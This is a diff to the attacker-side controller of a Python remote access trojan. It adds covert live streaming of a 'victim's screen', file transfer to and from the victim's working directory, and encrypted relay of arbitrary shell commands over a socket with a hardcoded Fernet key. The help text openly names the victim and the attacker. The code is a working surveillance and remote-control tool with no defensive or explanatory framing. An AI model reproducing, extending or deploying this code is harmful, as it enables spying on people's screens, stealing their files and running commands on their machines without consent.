@@ -1,5 +1,7 @@
-import socket, argparse, subprocess, re, os, time
+import socket, argparse, subprocess, re, time, os
 from sys import platform
+from vidstream import StreamingServer
+from threading import Thread
 from cryptography.fernet import Fernet
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
@@ -17,11 +19,15 @@ parser.add_argument(
 )
 
 
+
+hostname = socket.gethostname()
+IPAddr = socket.gethostbyname(hostname)
 args = parser.parse_args()
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = args.port
 BUFFER_SIZE = 1024 * 128
 SEPARATOR = "<sep>"
+receiver = StreamingServer(IPAddr, 423)
 key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
 
 
@@ -125,14 +131,38 @@ while True:
                 commands = "exit"
                 commands = Fernet(key).encrypt(commands.encode())
                 client_socket.send(commands)
+                msg = client_socket.recv(BUFFER_SIZE)
+                msg = Fernet(key).decrypt(msg).decode()
                 client_socket.close()
                 s.close()
-                print(f"\n[{EXIT}] {END}\n")
+                print(f"\n[{EXIT}] {msg}\n")
                 break
             if exit_choice == "n":
                 continue
-        commandz = Fernet(key).encrypt(command.encode())
-        client_socket.send(commandz)
+        if command == "/clear":
+            def clear():
+                os.system('cls' if os.name=='nt' else 'clear')
+                return("   ")
+            clear()
+            print(f"[{CLEAR}] ")
+            continue
+        if command == "/help":
+            print(
+        f'''{MAIN}
+        \r  Command                    Description
+        \r  -------                    -----------
+        \r  /help                       Print this message.
+        \r  /getlive                    Gets a live feed of victim's screen.
+        \r  /stoplive                   Stop the live feed of victim's screen.
+        \r  /send file                  Sends a file from the files directory in the attacker directory.
+        \r  /get file                   Gets a file from the victim's CWD and puts it into the files directory.
+        \r  /clear                      Clear screen.
+        \r  exit/quit/q                  Close session and exit.
+        {END}''')
+            continue
+        if command != "/clear" and command != "/help":
+            commandz = Fernet(key).encrypt(command.encode())
+            client_socket.send(commandz)
         if command == "/getfile":
             filenames = input(f"[{IMPORTANT}] Please enter the filename: ")
             filename = Fernet(key).encrypt(filenames.encode())
@@ -154,10 +184,16 @@ while True:
                 client_socket.send(dataLen.to_bytes(4,'big'))
                 client_socket.send(data)
             f.close()
+        if command == "/getlive":
+            p = Thread(target=receiver.start_server)
+            p.start()
+        if command == "/stoplive":
+            receiver.stop_server()
+            receiver = StreamingServer(IPAddr, 422)
         output = client_socket.recv(BUFFER_SIZE)
         output = Fernet(key).decrypt(output).decode()
         results, cwd = output.split(SEPARATOR)
-        if command != "/getfile" and command != "/sendfile":
+        if command != "/getfile" and command != "/sendfile" and command != "/getlive" and command != "/stoplive":
             print(f"{GREEN}{results}{END}")
         else: continue
     except KeyboardInterrupt:
